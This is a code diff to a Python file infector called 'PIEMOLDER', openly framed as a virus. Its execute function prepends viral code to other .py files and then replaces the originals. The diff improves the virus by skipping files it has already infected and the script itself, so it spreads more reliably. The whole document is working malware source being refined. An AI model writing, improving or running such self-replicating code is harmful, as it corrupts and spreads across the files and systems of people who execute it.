@@ -1,6 +1,3 @@
-# Let's make it self-replicating...
-
-
 # PIEMOLDER:START
 
 def execute(virus):
@@ -10,18 +7,20 @@ def execute(virus):
 
 	for py in allpies:
 		thepie = open(py, "r")
-		rottenpie = open("%s.rotten" % py, "w")
+		if "# PIEMOLDER:START" not in thepie.readline() and py != os.path.basename(__file__):
+			thepie = open(py, "r")
+			rottenpie = open("%s.rotten" % py, "w")
 
-		rottenpie.write(virus)
+			rottenpie.write(virus)
 
-		for line in thepie.readlines():
-			rottenpie.write(line)
+			for line in thepie.readlines():
+				rottenpie.write(line)
 
-		thepie.close()
-		rottenpie.close()
+			thepie.close()
+			rottenpie.close()
 
-		os.remove(py)
-		os.rename("%s.rotten" % py, py)
+			os.remove(py)
+			os.rename("%s.rotten" % py, py)
 
 
 import os
